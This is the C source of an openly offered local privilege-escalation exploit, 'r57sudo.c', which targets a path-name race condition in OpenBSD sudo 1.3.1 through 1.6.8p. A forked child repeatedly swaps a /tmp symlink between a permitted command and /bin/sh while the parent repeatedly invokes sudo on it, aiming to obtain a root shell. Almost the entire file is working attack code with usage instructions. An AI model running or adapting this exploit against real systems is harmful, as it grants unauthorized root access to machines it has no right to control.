#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sysexits.h>
#include <sys/wait.h>

#define SUDO "/usr/bin/sudo"
#ifdef BUFSIZ
#undef BUFSIZ
#define BUFSIZ 128
#endif

/*
ANY MODIFIED REPUBLISHING IS RESTRICTED
OpenBSD sudo 1.3.1 - 1.6.8p local root exploit
Tested under OpenBSD 3.6 sudo 1.6.7p5
Vuln by OpenBSD errata, http://www.openbsd.org/errata.html
(c)oded by __blf 2005 RusH Security Team, http://rst.void.ru
Race condition in path name, can take a while to exploit
Gr33tz: x97Rang, whice, rsh, MishaSt, Inck-Vizitor, BlackPrince
~censored~ lamerz: Saint_I, nmalykh
All rights reserved.
ANY MODIFIED REPUBLISHING IS RESTRICTED
*/

int main (int argc, char ** argv)
{
pid_t pid;
void * buffer;
char * exec, * race, * path;
if(argc != 3)
{
fprintf(stderr, "r57sudo.c by __blf\n");
fprintf(stderr, "RusH Security Team\n");
fprintf(stderr, "Usage: %s <sudo full path command> <sudo command>\n", argv[0]);
fprintf(stderr, "e.g. ./r57sudo /bin/ls ls\n");
return EX_USAGE;
}
pid = fork();
if(pid == 0)
{
while(1)
{
exec = (char *)calloc(BUFSIZ, sizeof(char));
race = (char *)calloc(BUFSIZ, sizeof(char));
bzero(exec, sizeof(exec));
snprintf(exec, BUFSIZ, "ln -fs %s /tmp/%s", argv[1], argv[2]);
system((char *)exec);
bzero(race, sizeof(race));
snprintf(race, BUFSIZ, "rm /tmp/%s", argv[2]);
system((char *)race);
bzero(race, sizeof(race));
snprintf(race, BUFSIZ, "ln -fs /bin/sh /tmp/%s", argv[2]);
system((char *)race);
bzero(race, sizeof(race));
snprintf(race, BUFSIZ, "rm /tmp/%s", argv[2]);
system((char *)race);
}
}
if(pid > 0)
{
while(1)
{
path = (char *)calloc(BUFSIZ/2, sizeof(char));
snprintf(path, BUFSIZ/2, "%s /tmp/%s", SUDO, argv[2]);
system((char *)path);
}
}
}